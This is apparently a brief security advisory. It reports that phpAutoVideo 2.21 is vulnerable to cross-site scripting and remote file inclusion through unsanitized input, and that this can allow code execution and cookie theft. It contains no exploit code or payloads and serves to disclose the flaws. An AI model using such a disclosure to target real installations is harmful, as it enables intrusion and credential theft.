phpAutoVideo is prone to a cross-site scripting vulnerability and a remote file-include vulnerability because it fails to properly sanitize user-supplied input.

Attackers can exploit these issues to execute arbitrary code within the context of the webserver process, steal cookie-based authentication credentials, and launch other attacks.

phpAutoVideo 2.21 is vulnerable; other versions may also be affected.
